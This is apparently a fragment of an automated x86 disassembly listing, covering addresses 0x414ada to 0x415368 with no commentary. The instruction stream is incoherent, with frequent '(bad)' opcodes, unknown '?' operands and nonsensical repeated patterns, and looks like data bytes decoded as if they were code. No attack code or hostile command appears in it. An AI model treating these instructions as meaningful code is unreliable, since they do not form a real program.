  414ada:	rcr    BYTE PTR [edx-0x494e5159],1
  414ae0:	mov    edx,0xc30400
  414ae5:	adc    dh,dl
  414ae7:	aam    0xc3
  414ae9:	(bad)  
  414aea:	mov    esi,0xc3c3b0be
  414aef:	mov    esi,0x857afbda
  414af4:	arpl   WORD PTR [ebp+0x26008407],ax
  414afa:	jp     0x414b5c
  414afc:	je     0x414a7e
  414afe:	cmp    BYTE PTR [esi-0x77],0x7f
  414b02:	jle    0x414a8d
  414b04:	mov    DWORD PTR [esi+edi*2+0x4187417e],ecx
  414b0b:	mov    WORD PTR [esi+edi*8-0x7f728082],cs
  414b12:	add    BYTE PTR [eax-0x7f817381],0x85
  414b19:	pusha  
  414b1a:	(bad)  
  414b1b:	std    
  414b1c:	xchg   edx,eax
  414b1d:	xchg   edx,eax
  414b1e:	xchg   edx,eax
  414b1f:	xchg   edx,eax
  414b20:	add    BYTE PTR [eax],al
  414b22:	add    BYTE PTR [ecx],bl
  414b24:	add    DWORD PTR [ecx-0x7f7e0203],0xbb017f6c
  414b2e:	ret    
  414b2f:	ret    
  414b30:	ret    
  414b31:	(bad)
  414b35:	std    
  414b36:	std    
  414b37:	add    DWORD PTR [ecx-0x454e6d03],eax
  414b3d:	add    BYTE PTR ds:0xd60f00c3,al
  414b43:	ret    
  414b44:	(bad)  
  414b45:	ret    
  414b46:	mov    ecx,0x8870fbd1
  414b4b:	inc    ebp
  414b4c:	test   DWORD PTR [ebp+0x858484],eax
  414b52:	add    al,0x84
  414b54:	add    BYTE PTR [edi],ah
  414b56:	test   DWORD PTR [ebx+esi*2+0x73],ebp
  414b5a:	cmp    BYTE PTR [edi+0x7f],0x89
  414b5e:	jle    0x414ae9
  414b60:	jle    0x414aee
  414b62:	inc    ecx
  414b63:	mov    WORD PTR [esp+ecx*4-0x78be73bf],cs
  414b6a:	xchg   DWORD PTR [edi-0x7f727277],eax
  414b70:	cmp    BYTE PTR [edi-0x77],0x7f
  414b74:	add    BYTE PTR [eax-0x26d0202],0x92
  414b7b:	mov    ?,ebp
  414b7d:	add    BYTE PTR [eax],al
  414b7f:	add    BYTE PTR [eax],al
  414b81:	sub    cl,BYTE PTR [esi+0x38609a92]
  414b87:	pop    eax
  414b88:	xor    al,0x7f
  414b8a:	xchg   edx,eax
  414b8b:	int    0xc3
  414b8d:	aam    0xc3
  414b8f:	aad    0xc3
  414b91:	mov    esi,0xb3b101ae
  414b96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b97:	std    
  414b98:	add    DWORD PTR [ecx-0x3c454966],0xb0bee7c3
  414ba2:	(bad)  
  414ba3:	rcr    BYTE PTR [edi-0x7b777790],1
  414ba9:	test   DWORD PTR [ebp+0x840785],eax
  414baf:	and    al,BYTE PTR [ebp+0x7f807474]
  414bb5:	jg     0x414b40
  414bb7:	jle    0x414c37
  414bb9:	mov    WORD PTR [ecx+eax*2-0x73be7374],cs
  414bc0:	inc    ecx
  414bc1:	mov    WORD PTR [edi-0x73717179],es
  414bc7:	mov    DWORD PTR [ebp+0x7f8d7f80],ecx
  414bcd:	lea    ecx,[ebp+0x4fd9289]
  414bd3:	xchg   edx,eax
  414bd4:	add    DWORD PTR [esi+0x2a000000],ecx
  414bda:	xchg   edx,eax
  414bdb:	jae    0x414c56
  414bdd:	and    eax,0x87352f4d
  414be2:	test   eax,0xd5d4dbf6
  414be7:	hlt    
  414be8:	ret    
  414be9:	mov    edi,0xd5b1fda9
  414bee:	xlat   BYTE PTR ds:[ebx]
  414bef:	mov    dh,0x9a
  414bf1:	add    DWORD PTR [ecx-0x4a6b5603],0xbcdac3c9
  414bfb:	ins    BYTE PTR es:[edi],dx
  414bfc:	mov    BYTE PTR [ebp-0x78],al
  414bff:	mov    al,BYTE PTR [ebp+eax*4-0x7bf87a7b]
  414c06:	add    BYTE PTR [esi],cl
  414c08:	ins    BYTE PTR es:[edi],dx
  414c09:	je     0x414c7e
  414c0b:	jg     0x414b96
  414c0d:	jle    0x414b98
  414c0f:	mov    DWORD PTR [esp+ecx*4-0x78927874],ecx
  414c16:	add    al,0x8c
  414c18:	add    BYTE PTR ds:0x9a879a87,dl
  414c1e:	xchg   DWORD PTR [ebp+ecx*4+0x7f8d807f],ecx
  414c25:	jg     0x414c9a
  414c27:	(bad)  
  414c28:	std    
  414c29:	std    
  414c2a:	mov    ss,WORD PTR [edx+0x8c8efd]
  414c30:	add    BYTE PTR [eax],al
  414c32:	add    BYTE PTR [edx],ah
  414c34:	inc    ebp
  414c35:	inc    ebx
  414c36:	cs cs das 
  414c39:	cmp    eax,DWORD PTR [eax-0x7f]
  414c3c:	mov    ah,0xd5
  414c3e:	fcmovnbe st,st(3)
  414c40:	fcmovnbe st,st(4)
  414c42:	aam    0xa
  414c44:	ret    0x89a4
  414c47:	rcl    dl,1
  414c49:	aam    0xb6
  414c4b:	add    DWORD PTR [ecx-0x2027e6e],0x6074b1a7
  414c55:	inc    esp
  414c56:	add    al,0x88
  414c58:	add    BYTE PTR [edx],dh
  414c5a:	test   BYTE PTR [ebp-0x7a7b7a7b],al
  414c60:	test   BYTE PTR [eax+ecx*4+0x736c8584],al
  414c67:	or     BYTE PTR [ebp-0x73bebe82],0x89
  414c6e:	dec    BYTE PTR [esp+ecx*4+0x41fe8c87]
  414c75:	mov    WORD PTR [ecx-0x78017379],cs
  414c7b:	mov    es,WORD PTR [edi-0x7f807f77]
  414c81:	jg     0x414d02
  414c83:	add    BYTE PTR [eax-0x6d026d03],0x8e
  414c8a:	mov    DWORD PTR [ebx+0x0],esi
  414c8d:	add    BYTE PTR [eax],al
  414c8f:	and    dl,BYTE PTR [esi+0x4d]
  414c92:	cmp    eax,0x6c1d3b56
  414c97:	xchg   DWORD PTR [esi+eax*1-0x3724161b],esp
  414c9e:	retf   0x7ca
  414ca1:	stc    
  414ca2:	mov    ebp,0xc9d4056c
  414ca7:	(bad)  
  414ca8:	std    
  414ca9:	cld    
  414caa:	std    
  414cab:	std    
  414cac:	mov    cs,WORD PTR [esi-0x7b858b82]
  414cb2:	add    al,0x88
  414cb4:	add    DWORD PTR [esp+eax*1-0x7bd2ff7b],eax
  414cbb:	test   DWORD PTR [esp+eax*4+0x73748584],eax
  414cc2:	jg     0x414c4d
  414cc4:	inc    ecx
  414cc5:	mov    WORD PTR [esi+edi*2-0x73017674],cs
  414ccc:	xchg   DWORD PTR [edi-0x73787872],eax
  414cd2:	mov    WORD PTR [edi-0x78717179],es
  414cd8:	mov    DWORD PTR [edi-0x80],edi
  414cdb:	or     BYTE PTR [ebp-0x717f7282],0x92
  414ce2:	xchg   edx,eax
  414ce3:	dec    BYTE PTR [ebp+0x8574]
  414ce9:	add    BYTE PTR [eax],al
  414ceb:	and    DWORD PTR [edi],ebp
  414ced:	push   esi
  414cee:	dec    ebp
  414cef:	das    
  414cf0:	cmp    ecx,DWORD PTR [esi+0x64]
  414cf3:	gs cli 
  414cf5:	add    al,ch
  414cf7:	jmp    0xe00b53c4
  414cfc:	into   
  414cfd:	stc    
  414cfe:	jecxz  0x414d38
  414d00:	mov    ah,0xcb
  414d02:	shl    BYTE PTR [ebp-0x73650257],cl
  414d08:	jg     0x414d88
  414d0a:	and    BYTE PTR [eax-0x7b],0x0
  414d0e:	add    eax,0x85060088
  414d13:	test   BYTE PTR [ebp+0x4858484],al
  414d19:	test   BYTE PTR [eax],al
  414d1b:	sub    BYTE PTR [eax+eiz*2-0x80],ch
  414d1f:	jle    0x414d8e
  414d21:	mov    gs,WORD PTR [ebp-0x7f]
  414d24:	xchg   DWORD PTR [esp+ecx*4-0x78787874],ecx
  414d2b:	mov    ?,esi
  414d2d:	mov    WORD PTR [esp+ecx*4-0x7e787179],cs
  414d34:	mov    cs,WORD PTR [ebp+ecx*4+0x7f808080]
  414d3b:	jg     0x414cca
  414d3d:	mov    ebp,?
  414d3f:	mov    DWORD PTR [ebx+0x7a],esi
  414d42:	test   BYTE PTR [eax+0x3f000000],cl
  414d48:	cs cs das 
  414d4b:	cmp    esp,DWORD PTR [ebx]
  414d4d:	es mov esp,0xc8d5c0d0
  414d53:	test   edx,0xeecc0eca
  414d59:	into   
  414d5a:	into   
  414d5b:	adc    al,0x38
  414d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d5e:	int    0xd4
  414d60:	mov    dh,0x87
  414d62:	jle    0x414de3
  414d64:	jg     0x414de5
  414d66:	jae    0x414dd4
  414d68:	test   BYTE PTR [eax-0x7b7b7778],cl
  414d6e:	test   DWORD PTR [esp+eax*4-0x7b7b7a7b],eax
  414d75:	mov    BYTE PTR [edx+edi*2-0x76808b94],al
  414d7c:	stos   DWORD PTR es:[edi],eax
  414d7d:	mov    dh,0xb6
  414d7f:	mov    dh,0xab
  414d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d82:	mov    WORD PTR [edi+0x8e8c8e],es
  414d88:	add    al,0x87
  414d8a:	add    BYTE PTR ds:0x8787878e,dl
  414d90:	mov    ?,esi
  414d92:	mov    WORD PTR [edi+0x7f],?
  414d95:	add    BYTE PTR [eax+0x7f8d8d8d],0x74
  414d9c:	test   DWORD PTR [edx+ecx*4+0x8888],eax
  414da3:	add    BYTE PTR [eax],al
  414da5:	sbb    DWORD PTR [esi+0x56],ebp
  414da8:	dec    ecx
  414da9:	adc    cl,BYTE PTR [ebx]
  414dab:	or     al,bh
  414dad:	aad    0xeb
  414daf:	xlat   BYTE PTR ds:[ebx]
  414db0:	enter  0xcac8,0x6
  414db4:	int3   
  414db5:	into   
  414db6:	out    dx,al
  414db7:	into   
  414db8:	into   
  414db9:	jecxz  0x414e11
  414dbb:	inc    esp
  414dbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dbd:	ror    BYTE PTR [ecx+0x7f0500],1
  414dc3:	add    esp,DWORD PTR [edx+edi*2-0x7c]
  414dc7:	add    BYTE PTR [eax+ecx*4],al
  414dca:	add    BYTE PTR [ebx],dh
  414dcc:	test   BYTE PTR [ebp+eax*4-0x7b7a7b7b],al
  414dd3:	test   BYTE PTR [eax+ecx*4-0x43579f86],al
  414dda:	fcmovu st,st(1)
  414ddc:	(bad)  
  414dde:	jmp    0x414db9
  414de0:	fidivr DWORD PTR [edi+eiz*4-0x78787179]
  414de7:	xchg   DWORD PTR [edi+eax*4-0x78787179],ecx
  414dee:	xchg   DWORD PTR [esi-0x7f727679],ecx
  414df4:	add    BYTE PTR [eax-0x758c7681],0x88
  414dfb:	mov    cl,BYTE PTR [eax+0x8888]
  414e01:	add    BYTE PTR [eax],al
  414e03:	sbb    dl,BYTE PTR [ecx]
  414e05:	or     al,al
  414e07:	(bad)  
  414e08:	test   bh,0xc4
  414e0b:	(bad)  
  414e0c:	or     dl,bh
  414e0e:	enter  0xcac8,0xcc
  414e12:	into   
  414e13:	jecxz  0x414e0e
  414e15:	into   
  414e16:	stc    
  414e17:	into   
  414e18:	and    eax,0x7ffd4425
  414e1d:	lea    eax,[edi+edi*2]
  414e20:	add    BYTE PTR [esi],ch
  414e22:	je     0x414da9
  414e24:	mov    BYTE PTR [edx-0x7b777778],cl
  414e2a:	test   DWORD PTR [ebp+eax*4-0x777b7b7c],eax
  414e31:	mov    BYTE PTR [edx+edi*2-0x2a24253e],al
  414e38:	jmp    0x414e0f
  414e3a:	mov    esp,0xdad7ebeb
  414e40:	mov    ah,0x81
  414e42:	xchg   DWORD PTR [edx-0x1787802],ebx
  414e48:	xchg   DWORD PTR [edx-0x71717179],ebx
  414e4e:	inc    ecx
  414e4f:	mov    DWORD PTR [eax+eax*4],eax
  414e52:	add    BYTE PTR [eax],cl
  414e54:	jg     0x414ec9
  414e56:	lahf   
  414e57:	xchg   BYTE PTR [esp+eax*4+0x8484],al
  414e5e:	add    BYTE PTR [edx],ch
  414e60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e61:	mov    edx,0xc7c7f6be
  414e66:	imul   bl
  414e68:	fxch   st(0)
  414e6a:	xlat   BYTE PTR ds:[ebx]
  414e6b:	push   es
  414e6c:	in     eax,dx
  414e6d:	in     eax,dx
  414e6e:	stc    
  414e6f:	into   
  414e70:	into   
  414e71:	out    dx,al
  414e72:	into   
  414e73:	int3   
  414e74:	adc    ebp,DWORD PTR [esi]
  414e76:	push   eax
  414e77:	push   edi
  414e78:	mov    WORD PTR [edi-0x80],?
  414e7b:	lea    ecx,[ecx-0x797a8b80]
  414e81:	mov    BYTE PTR [eax-0x7b7b7b78],cl
  414e87:	test   DWORD PTR [ebp+0x840585],eax
  414e8d:	sbb    cl,al
  414e8f:	fucomi st,st(1)
  414e91:	call   0xb809246d
  414e96:	mov    edi,0xb7d7d7d7
  414e9c:	mov    ebx,0x9a8781fe
  414ea1:	xchg   DWORD PTR [edx+0x4fe878e],ebx
  414ea7:	mov    es,WORD PTR [eax]
  414ea9:	or     eax,0x8073807e
  414eae:	cmp    BYTE PTR [edi-0x77],0x7a
  414eb2:	lahf   
  414eb3:	test   BYTE PTR [esp+eax*4+0x84],al
  414eba:	add    BYTE PTR [ebx],al
  414ebc:	std    
  414ebd:	scas   al,BYTE PTR es:[edi]
  414ebe:	retf   
  414ebf:	add    BYTE PTR ds:0xa3b00c7,al
  414ec5:	test   eax,0xcccceeca
  414ecb:	int3   
  414ecc:	pmaxsw mm1,QWORD PTR [edi]
  414ecf:	into   
  414ed0:	adc    bh,BYTE PTR [ebx]
  414ed2:	sbb    eax,0x7d8d7f40
  414ed7:	jg     0x414f58
  414ed9:	jg     0x414f3b
  414edb:	test   DWORD PTR [eax-0x777b7b76],ecx
  414ee1:	test   BYTE PTR [ebp+eax*4-0x7b7b7a7c],al
  414ee8:	test   BYTE PTR [eax-0x242c2c3f],cl
  414eee:	xlat   BYTE PTR ds:[ebx]
  414eef:	aad    0xd7
  414ef1:	(bad)  
  414ef2:	jmp    0xc7c7:0xc7d7c7c7
  414ef9:	xlat   BYTE PTR ds:[ebx]
  414efa:	mov    ebx,0x8c878e9a
  414eff:	add    BYTE PTR [esi+ecx*4],al
  414f02:	add    BYTE PTR [ecx],dl
  414f04:	dec    BYTE PTR [esi+0x7f8c8e8e]
  414f0a:	jae    0x414f7f
  414f0c:	jae    0x414e9b
  414f0e:	jg     0x414ea6
  414f10:	test   BYTE PTR [ebp+0x848585],al
  414f16:	add    BYTE PTR [eax],al
  414f18:	add    BYTE PTR [ebx],ah
  414f1a:	add    ebp,edi
  414f1c:	mov    bl,0xd5
  414f1e:	test   dh,0xd7
  414f21:	(bad)  
  414f22:	mov    bh,0xd7
  414f24:	neg    eax
  414f26:	int3   
  414f27:	out    dx,al
  414f28:	out    dx,al
  414f29:	out    dx,al
  414f2a:	int3   
  414f2b:	into   
  414f2c:	jecxz  0x414f27
  414f2e:	adc    DWORD PTR [ebx],esp
  414f30:	dec    esi
  414f31:	and    BYTE PTR [eax-0x77],ah
  414f34:	jge    0x414fb5
  414f36:	mov    DWORD PTR [eax-0x77777b8c],eax
  414f3c:	mov    BYTE PTR [eax],al
  414f3e:	or     al,BYTE PTR [eax+eax*1-0x16162ef8]
  414f45:	rcr    ebx,cl
  414f47:	fcmovnbe st,st(7)
  414f49:	jmp    0x414f51
  414f4b:	mov    DWORD PTR [eax],0xb7ebd70b
  414f51:	div    BYTE PTR [esi-0x656d7e79]
  414f57:	mov    ?,esi
  414f59:	add    BYTE PTR [esi+ecx*4],al
  414f5c:	add    BYTE PTR [esi],cl
  414f5e:	xchg   DWORD PTR [edi+0x7373737f],eax
  414f64:	cmp    BYTE PTR [edi+0x73],0x85
  414f68:	test   DWORD PTR [esp+eax*4+0x85],eax
  414f6f:	and    BYTE PTR [edx-0x484558ff],dl
  414f75:	or     bl,cl
  414f77:	enter  0xcac8,0x6
  414f7b:	in     eax,dx
  414f7c:	out    dx,al
  414f7d:	int3   
  414f7e:	int3   
  414f7f:	int3   
  414f80:	pavgw  mm4,mm3
  414f83:	jecxz  0x414f97
  414f85:	sbb    BYTE PTR [eax],ah
  414f87:	and    ebx,DWORD PTR [edi-0x57]
  414f8a:	jg     0x41500b
  414f8c:	jle    0x41500d
  414f8e:	test   al,0x85
  414f90:	add    eax,0x84030088
  414f95:	test   BYTE PTR [eax+eax*1+0x4],al
  414f99:	test   BYTE PTR [eax],al
  414f9b:	sub    al,0x9f
  414f9d:	call   0xdc1d397d
  414fa2:	xlat   BYTE PTR ds:[ebx]
  414fa3:	xlat   BYTE PTR ds:[ebx]
  414fa4:	mov    edi,0xd5c6c7c6
  414faa:	mov    bh,0xc7
  414fac:	div    BYTE PTR [edi-0x251263a]
  414fb2:	or     DWORD PTR [esi-0x71787103],0x8e9a8e8e
  414fbc:	mov    DWORD PTR [eax+0x7f807473],eax
  414fc2:	add    BYTE PTR [ebp-0x7b7b7a7b],0x0
  414fc9:	add    BYTE PTR [eax],al
  414fcb:	and    ch,bh
  414fcd:	mov    es,WORD PTR [ecx]
  414fcf:	mov    cl,0xcb
  414fd1:	(bad)  
  414fd3:	enter  0xedf7,0xed
  414fd7:	out    dx,al
  414fd8:	into   
  414fd9:	out    dx,al
  414fda:	into   
  414fdb:	bswap  esi
  414fdd:	jecxz  0x414fc2
  414fdf:	jecxz  0x414fc5
  414fe1:	and    eax,0x7d2c2320
  414fe6:	jg     0x415066
  414fe8:	mov    DWORD PTR [eax-0x77fb7ba0],eax
  414fee:	pop    es
  414fef:	test   BYTE PTR [eax],al
  414ff1:	or     al,0x9f
  414ff3:	rcr    bl,0xdb
  414ff6:	jmp    0xd61918c0
  414ffb:	(bad)  
  414ffc:	aad    0xc6
  414ffe:	push   es
  414fff:	mov    DWORD PTR [eax],0xc6c6c607
  415005:	mov    edx,0x92fda7
  41500a:	pop    es
  41500b:	mov    es,WORD PTR [eax]
  41500d:	or     eax,0x738dfe39
  415012:	jae    0x415088
  415014:	cmp    BYTE PTR [edi+0x7a],0x88
  415018:	test   BYTE PTR [eax+ecx*4+0x0],al
  41501f:	and    BYTE PTR [edx-0x2f71716e],dl
  415025:	mov    bh,0xc8
  415027:	test   DWORD PTR [esi],0xcececcd8
  41502d:	stc    
  41502e:	stc    
  41502f:	jecxz  0x415014
  415031:	into   
  415032:	into   
  415033:	into   
  415034:	loope  0x415049
  415036:	sbb    eax,0xa959203b
  41503b:	mov    DWORD PTR [esi-0x80],edi
  41503e:	ins    BYTE PTR es:[edi],dx
  41503f:	test   BYTE PTR ds:0x84330088,al
  415045:	test   BYTE PTR [edi+ebx*4-0x24057b78],al
  41504c:	repnz fcmovnbe st,st(3)
  41504f:	fcmovnu st,st(3)
  415051:	call   0xeb091841
  415056:	mov    bh,0xb7
  415059:	jmp    0x415022
  41505b:	mov    edi,0xb6c4c6c6
  415061:	std    
  415062:	mov    es,WORD PTR [ecx-0x71717e03]
  415068:	adc    DWORD PTR [edx-0x7f766502],0x80737374
  415072:	jp     0x414ffc
  415074:	test   BYTE PTR [eax+0x84],cl
  41507a:	add    BYTE PTR [esi+ecx*4],ah
  41507d:	std    
  41507e:	mov    es,WORD PTR [ecx]
  415080:	scas   al,BYTE PTR es:[edi]
  415081:	fxch   st(0)
  415083:	retf   0xeded
  415086:	in     eax,dx
  415087:	out    dx,al
  415088:	stc    
  415089:	stc    
  41508a:	adc    ebx,esp
  41508c:	stc    
  41508d:	out    dx,al
  41508e:	into   
  41508f:	out    dx,al
  415090:	pmulhuw mm3,QWORD PTR [edx]
  415093:	and    BYTE PTR [edi],bl
  415095:	ss jg  0x415021
  415098:	jg     0x41510d
  41509a:	ins    BYTE PTR es:[edi],dx
  41509b:	mov    BYTE PTR [edx+0x7888488],cl
  4150a1:	test   BYTE PTR [eax],al
  4150a3:	sub    eax,0xd3dbd30b
  4150a8:	fcmovnb st,st(5)
  4150aa:	fcmovnbe st,st(7)
  4150ac:	mov    bh,0xd5
  4150ae:	mov    edi,0xc7b7c7ea
  4150b4:	xlat   BYTE PTR ds:[ebx]
  4150b5:	mov    esi,0xcdbec6c6
  4150bb:	call   0x8efe:0x8e8e9281
  4150c2:	mov    es,WORD PTR [ecx+0x7f8c8792]
  4150c8:	jae    0x41513e
  4150ca:	jae    0x41504c
  4150cc:	je     0x415053
  4150ce:	test   DWORD PTR [ebp+0x85],eax
  4150d4:	add    BYTE PTR [eax-0x3],bl
  4150d7:	mov    ?,ebp
  4150d9:	sbb    DWORD PTR [edx-0x12083530],0xcecceeed
  4150e3:	psubw  mm1,mm6
  4150e6:	out    dx,al
  4150e7:	into   
  4150e8:	into   
  4150e9:	into   
  4150ea:	pop    es
  4150eb:	stos   BYTE PTR es:[edi],al
  4150ec:	mov    ds:0x654c28bd,eax
  4150f1:	mov    DWORD PTR [ecx-0x7777938d],ecx
  4150f7:	test   BYTE PTR [eax-0x7b7b777c],cl
  4150fd:	test   DWORD PTR [esp+eax*4-0x242d2678],eax
  415104:	rcl    ebx,cl
  415106:	fcmovnu st,st(3)
  415108:	xlat   BYTE PTR ds:[ebx]
  415109:	aad    0xc7
  41510b:	(bad)  
  41510c:	(bad)  
  41510d:	mov    edi,0xc7c7d7c7
  415113:	mov    dh,0xc6
  415116:	mov    edi,0xfcfda7cb
  41511b:	mov    es,WORD PTR [edi-0x6d717172]
  415121:	or     DWORD PTR [esi+0x737f8987],0x6c648074
  41512b:	ins    BYTE PTR es:[edi],dx
  41512c:	ins    BYTE PTR es:[edi],dx
  41512d:	ins    BYTE PTR es:[edi],dx
  41512e:	add    BYTE PTR [eax],al
  415130:	add    BYTE PTR [edx],ah
  415132:	mov    ?,ebp
  415134:	std    
  415135:	std    
  415136:	mov    ?,WORD PTR [eax+ecx*8-0x33331236]
  41513d:	stc    
  41513e:	out    dx,al
  41513f:	into   
  415140:	int3   
  415141:	out    dx,al
  415142:	into   
  415143:	out    dx,al
  415144:	jecxz  0x415114
  415146:	jecxz  0x415114
  415148:	mov    ds:0x5fef9ea2,al
  41514d:	add    DWORD PTR [ecx+0x73],0x888888a8
  415154:	push   es
  415155:	test   BYTE PTR [eax],al
  415157:	adc    cl,BYTE PTR [eax-0x2437047c]
  41515d:	fcmovnu st,st(3)
  41515f:	rcr    ebx,cl
  415161:	fcmovnbe st,st(5)
  415163:	mov    bh,0xeb
  415165:	mov    edi,0x4d7c7eb
  41516b:	mov    DWORD PTR [eax],0xf6c6c61a
  415171:	mov    al,0xb3
  415173:	std    
  415174:	std    
  415175:	(bad)  
  415176:	xchg   edx,eax
  415177:	cld    
  415178:	mov    cs,WORD PTR [esi-0x78710272]
  41517e:	mov    WORD PTR [ebp-0x7f8b8b80],cs
  415184:	je     0x4151fa
  415186:	je     0x4151fc
  415188:	add    BYTE PTR [eax],al
  41518a:	add    BYTE PTR [ebx],ah
  41518c:	std    
  41518d:	mov    cs,WORD PTR [esi-0x3f8c0179]
  415193:	in     eax,dx
  415194:	in     eax,dx
  415195:	out    dx,al
  415196:	stc    
  415197:	stc    
  415198:	into   
  415199:	out    dx,al
  41519a:	int3   
  41519b:	out    dx,al
  41519c:	into   
  41519d:	stc    
  41519e:	into   
  41519f:	stc    
  4151a0:	stc    
  4151a1:	loope  0x415146
  4151a3:	mov    al,ds:0xaea1a2a2
  4151a8:	mov    DWORD PTR [eax-0x60757ba1],eax
  4151ae:	mov    BYTE PTR [eax],al
  4151b0:	add    eax,0x8f030084
  4151b5:	jo     0x415179
  4151b7:	add    BYTE PTR [edi],al
  4151b9:	fild   DWORD PTR [eax]
  4151bb:	adc    eax,0xd7ebd7d7
  4151c0:	jmp    0x415189
  4151c2:	jmp    0x41518b
  4151c4:	mov    edi,0xc6c6c7c6
  4151ca:	(bad)  
  4151cb:	mov    esi,0x8e81fcd0
  4151d0:	cld    
  4151d1:	add    BYTE PTR [esi+ecx*4],al
  4151d4:	add    BYTE PTR ds:0x9a8e8e92,cl
  4151da:	mov    DWORD PTR [eax-0x727f8b8c],eax
  4151e0:	mov    DWORD PTR [ebp+0x89],ecx
  4151e6:	add    BYTE PTR [ebx],ch
  4151e8:	std    
  4151e9:	mov    ss,WORD PTR [edx-0x5767379]
  4151ef:	int3   
  4151f0:	pmaxsw mm7,mm1
  4151f3:	into   
  4151f4:	into   
  4151f5:	out    dx,al
  4151f6:	out    dx,al
  4151f7:	int3   
  4151f8:	stc    
  4151f9:	into   
  4151fa:	stc    
  4151fb:	out    dx,al
  4151fc:	into   
  4151fd:	loope  0x4151a2
  4151ff:	mov    ds:0xa0a2a2a0,al
  415204:	mov    eax,ds:0x7084a894
  415209:	mov    BYTE PTR [eax+ecx*4-0x7b7b7bbc],al
  415210:	mov    BYTE PTR [edx+edi*8+0xdb0400],al
  415217:	sub    ebp,eax
  415219:	fucomi st,st(0)
  41521b:	xlat   BYTE PTR ds:[ebx]
  41521c:	jmp    0x4151e5
  41521e:	jmp    0x4151e7
  415220:	xlat   BYTE PTR ds:[ebx]
  415221:	xlat   BYTE PTR ds:[ebx]
  415222:	mov    bh,0xeb
  415224:	mov    edi,0xbfc6eac6
  41522a:	mov    esi,0x8e81a7ad
  41522f:	mov    ?,esi
  415231:	mov    ss,WORD PTR [edx-0x71027172]
  415237:	dec    BYTE PTR [esi-0x699b8c77]
  41523d:	mov    DWORD PTR [esi+0x8e8e],ecx
  415243:	add    BYTE PTR [eax],al
  415245:	pop    ss
  415246:	xchg   edx,eax
  415247:	mov    es,WORD PTR [edi-0x437f8077]
  41524d:	int3   
  41524e:	int3   
  41524f:	into   
  415250:	jecxz  0x41521e
  415252:	out    dx,al
  415253:	bswap  esi
  415255:	stc    
  415256:	stc    
  415257:	stc    
  415258:	out    dx,al
  415259:	stc    
  41525a:	jecxz  0x415255
  41525c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41525d:	add    BYTE PTR ds:0x9c1000a0,al
  415263:	pushf  
  415264:	popf   
  415265:	mov    ds:0x44848690,eax
  41526a:	test   BYTE PTR [eax+ecx*4-0x57b7b7c],al
  415271:	hlt    
  415272:	push   es
  415273:	fild   DWORD PTR [eax]
  415275:	es call 0xc82d2a52
  41527b:	(bad)  
  41527c:	xlat   BYTE PTR ds:[ebx]
  41527d:	xlat   BYTE PTR ds:[ebx]
  41527e:	mov    edi,0xc6bfc6c4
  415284:	mul    al
  415286:	retf   
  415287:	scas   al,BYTE PTR es:[edi]
  415288:	std    
  415289:	mov    ?,esp
  41528b:	mov    ss,WORD PTR [edx-0x7e6d7172]
  415291:	xchg   edx,eax
  415292:	cld    
  415293:	xchg   edx,eax
  415294:	mov    WORD PTR [eax-0x2728b8d],es
  41529a:	xchg   edx,eax
  41529b:	xchg   edx,eax
  41529c:	add    BYTE PTR [eax],al
  41529e:	add    BYTE PTR [edx],bl
  4152a0:	mov    ?,esi
  4152a2:	mov    DWORD PTR [ecx+0x8a87380],ecx
  4152a8:	stc    
  4152a9:	jecxz  0x415279
  4152ab:	out    dx,al
  4152ac:	out    dx,al
  4152ad:	stc    
  4152ae:	jecxz  0x4152a9
  4152b0:	stc    
  4152b1:	into   
  4152b2:	out    dx,al
  4152b3:	stc    
  4152b4:	into   
  4152b5:	pop    es
  4152b6:	stos   BYTE PTR es:[edi],al
  4152b7:	mov    al,ds:0x9d04a0a0
  4152bc:	add    BYTE PTR [eax],dl
  4152be:	pushf  
  4152bf:	popf   
  4152c0:	mov    al,ds:0x8484c2a1
  4152c5:	mov    BYTE PTR [esp+eax*4-0xb057b78],al
  4152cc:	fcmovnbe st,st(5)
  4152ce:	add    al,0xdb
  4152d0:	add    BYTE PTR [ecx],bl
  4152d2:	mov    bh,0xdb
  4152d4:	mov    bh,0xd7
  4152d6:	(bad)  
  4152d7:	jmp    0x4152a0
  4152d9:	(bad)  
  4152da:	jmp    0x4152a2
  4152dc:	(bad)  
  4152dd:	mov    esi,0xd6bfbfc6
  4152e2:	lods   al,BYTE PTR ds:[esi]
  4152e3:	scas   al,BYTE PTR es:[edi]
  4152e4:	or     DWORD PTR [esi-0x7171717f],0x8e050092
  4152ee:	add    BYTE PTR [eax],cl
  4152f0:	dec    BYTE PTR [ecx-0x7e7f8b80]
  4152f6:	xchg   edx,eax
  4152f7:	xchg   edx,eax
  4152f8:	add    BYTE PTR [eax],al
  4152fa:	add    BYTE PTR [ebx],bl
  4152fc:	mov    es,WORD PTR [ecx-0x79]
  4152ff:	jg     0x415374
  415301:	je     0x41536f
  415303:	out    dx,eax
  415304:	jecxz  0x4152e9
  415306:	into   
  415307:	stc    
  415308:	stc    
  415309:	jecxz  0x415304
  41530b:	stc    
  41530c:	stc    
  41530d:	out    dx,al
  41530e:	stc    
  41530f:	into   
  415310:	out    dx,al
  415311:	pop    es
  415312:	stos   BYTE PTR es:[edi],al
  415313:	mov    ds:0xa09da0,al
  415318:	push   es
  415319:	popf   
  41531a:	add    BYTE PTR [edi],dh
  41531c:	pushf  
  41531d:	popf   
  41531e:	mov    eax,ds:0x708488bc
  415323:	test   BYTE PTR [eax-0x2a2b2b06],cl
  415329:	fcmovnbe st,st(5)
  41532b:	fcmovnbe st,st(7)
  41532d:	fcmovnbe st,st(5)
  41532f:	aad    0xea
  415331:	mov    edi,0xc7c6c7b7
  415337:	mov    esi,0xbfbfbfc6
  41533d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41533e:	scas   al,BYTE PTR es:[edi]
  41533f:	or     DWORD PTR [esi-0x6d6d7172],0x9a8e8e8e
  415349:	mov    es,WORD PTR [ecx+0x747f898e]
  41534f:	jae    0x4152df
  415351:	std    
  415352:	xchg   edx,eax
  415353:	add    BYTE PTR [eax],al
  415355:	add    BYTE PTR [eax],al
  415357:	or     BYTE PTR [esi+eax*4+0x60806088],al
  41535e:	jp     0x41531d
  415360:	push   es
  415361:	jecxz  0x415363
  415363:	psubw  mm5,mm6
  415366:	into   
  415367:	stc    
  415368:	into   
